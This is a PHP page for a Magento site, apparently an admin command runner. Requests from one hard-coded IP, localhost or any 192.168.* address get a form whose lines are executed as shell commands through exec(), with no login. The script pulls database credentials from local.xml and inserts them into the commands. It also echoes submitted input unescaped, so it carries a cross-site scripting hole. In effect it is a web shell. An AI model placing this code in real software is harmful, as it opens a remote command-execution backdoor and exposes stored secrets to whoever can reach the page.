<?php if(in_array($_SERVER['REMOTE_ADDR'], array('78.61.240.87', '127.0.0.1')) || strpos($_SERVER['REMOTE_ADDR'], '192.168.') === 0) : ?>
	<?php 
	$workPath = dirname(__FILE__);
	if (!($mageLocalXml = simplexml_load_string(file_get_contents($workPath.'/app/etc/local.xml')))) {
        throw new Exception(sprintf('ERROR: %s file not found.', $workPath.'/app/etc/local.xml'));
    }  
	$connectionXml = $mageLocalXml->global->resources->default_setup->connection;
	$command = isset($_POST['command']) ? $_POST['command'] : "";
	?>
    <p>DATABASE: <?php echo (string)$connectionXml->dbname ?></p>
    <?php if(isset($_POST['command'])) : ?>
    <?php
        ini_set('max_execution_time', 0);
        chdir($workPath);
        try {
			$_POST['command'] =
			    str_replace("{{host}}", ((string)$connectionXml->host),
			    str_replace("{{user}}", ((string)$connectionXml->username),
			    str_replace("{{password}}", ((string)$connectionXml->password),
			    str_replace("{{dbname}}", ((string)$connectionXml->dbname),
                str_replace("{{workpath}}", $workPath,
                str_replace("\\'", "'",
			    $_POST['command']))))));
			foreach ($_SERVER as $key => $value) {
			    putenv("$key=$value");
			}

			foreach (explode("\n", $_POST['command']) as $singleCommand) {
			    if (!($singleCommand = trim($singleCommand))) {
			        continue;
			    }

    			?><p><span><?php echo $workPath ?>&gt;</span><strong><?php echo $singleCommand ?></strong></p><?php
                if (($pos = strpos($singleCommand, '>')) !== false) {
                    $singleCommand = substr($singleCommand, 0, $pos). ' 2>&1 '.substr($singleCommand, $pos);
                }
                else {
                    $singleCommand .= ' 2>&1 ';
                }

                exec($singleCommand, $output, $returnVar);
                if ($returnVar != 0) {
                    echo "<strong>FAILED</strong><br />";
                }
                else {
                    echo "<strong>SUCCESS</strong><br />";
                }
                echo "<pre>";
                foreach ($output as $str) {
                    echo "$str<br />";
                }
                echo "</pre>";
                if ($returnVar != 0) {
                    break;
                }
            }

        }
		catch (Exception $e) {
			?>
			<div style="margin: 40px 40px 0; background: #f2c4c4; font: 16px/1.5em Arial, Helvetica, sans-serif; border: 2px solid #960000; padding: 10px;">
				<?php echo str_replace("\n", '<br />', $e) ?>
			</div>
			<?php
			if (!empty($db)) {
				$db = null;
			}
		}
	?>
	<?php endif; ?>
	<form method="POST" action="run.php">
        <p><span><?php echo $workPath ?>&gt;</span></p>
		<textarea name="command" cols="100" rows="25"><?php echo $command ?></textarea>
		<button type="submit">Go</button>
	</form>
<?php endif; ?>